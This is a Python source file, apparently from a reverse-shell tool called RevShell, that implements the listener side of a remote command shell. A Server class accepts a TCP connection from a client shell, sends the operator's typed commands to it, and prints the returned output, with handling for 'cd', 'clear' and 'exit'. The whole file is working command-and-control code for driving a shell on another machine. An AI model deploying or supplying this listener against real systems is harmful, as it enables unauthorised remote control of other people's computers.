import getpass

from .nodeutils import (
    os,
    socket,
    Path,
    subprocess,
    struct,
    sys,
    StreamSocket,
    utils
)


class Server(StreamSocket):
    """TCP socket server class for the command shell"""
    def __init__(
        self,
        lhost: str,
        port: int,
        shell_exec: str,
        verbose: bool,
        debug: bool
    ):
        super().__init__(lhost, port, shell_exec, verbose, debug)

    def listen(self) -> None:
        """Begin listening for incoming TCP connection from the client shell"""

        # TODO: configure timeouts and blocking
        addr = ()
        client_sock = socket.socket()
        server_sock = socket.socket()

        server_sock.settimeout(180)
        server_sock.bind((self.Address, self.Port))

        server_sock.listen(1)  # stay open for one connection
        utils.status(f"Listening for incoming TCP connection on port {self.Port}...")

        try:
            client_sock, addr = server_sock.accept()
        except socket.timeout:
            client_sock.close()
            server_sock.close()
            utils.throw("The listening socket has timeout out")
        finally:
            server_sock.setblocking(True)

        with client_sock:
            # TODO: print additional info in opening banner
            utils.status(f"Received connection from {addr[0]} on port {addr[1]}.")

            user, host = getpass.getuser(), socket.gethostname()
            self.send(client_sock, f"Connection established with {host}.")

            client_info = self.receive(client_sock).decode()
            utils.status(client_info)

            try:
                # TODO: fix prompt to show remote directory instead of local
                # TODO: change stdout color when its an error
                while True:
                    command = input(self.get_prompt().decode())

                    # send => command to be executed
                    self.send(client_sock, command)
                    family = self.check_special(command)

                    if family != "exit":
                        # receive => command output
                        output = self.receive(client_sock).decode()

                        # TODO: add logic for when successfully changed directories
                        if (family == "cd") & (output == command):
                            self.LastWD = Path(output.split()[1]).resolve()
                            utils.status("", "output", command)

                        elif family == "clear":
                            print(utils.Ansi.clear().decode(), end="")
                        else:
                            utils.status(output, "output", command)
                    else:
                        if self.Verbose:
                            utils.status("Exiting RevShell")
                        break
            except Exception as exc:
                try:
                    client_sock.shutdown(socket.SHUT_WR)
                except OSError:
                    pass
                finally:
                    server_sock.close()

                self.except_handler(exc)
            finally:
                try:
                    client_sock.shutdown(socket.SHUT_WR)
                    server_sock.shutdown(socket.SHUT_WR)
                except OSError:
                    pass
                finally:
                    server_sock.close()
